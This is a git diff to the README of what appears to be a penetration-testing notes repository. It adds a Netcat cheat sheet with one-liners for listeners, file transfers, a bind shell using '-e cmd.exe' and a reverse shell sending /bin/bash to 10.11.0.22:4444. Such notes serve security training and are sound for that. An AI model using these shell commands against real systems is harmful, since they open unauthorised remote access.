@@ -26,6 +26,7 @@ EasyG started out as a script that I use to automate some information gathering 
 - [Tools](#tools)
   - [Burp Suite](#burp-suite)
   - [EasyG](#easyg)
+  - [Netcat](#netcat)
 - [Network](#network)
 - [Linux](#linux)
 - [Mobile](#mobile)
@@ -382,6 +383,19 @@ EasyG started out as a script that I use to automate some information gathering 
   - [selenium.rb](scripts/selenium.rb) take screenshots from a list of targets as an input
   - [zip.py](scripts/zip.py) create custom zip files
 - [shells](shells/) to test file uploads
+
+
+### <ins>Netcat</ins>
+
+```
+nc -nv 10.11.0.22 110                                                      Connect to a TCP port
+nc -nlvp 4444                                                              Set up a listener
+nc -nv 10.11.0.22 4444                                                     Connect to a listener
+nc -nlvp 4444 > incoming.exe                                               Receive a file
+nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe    Transfer a file
+nc -nlvp 4444 -e cmd.exe                                                   Set up a bind shell
+nc -nv 10.11.0.22 4444 -e /bin/bash                                        Send a reverse shell
+```
 
 
 ## Network
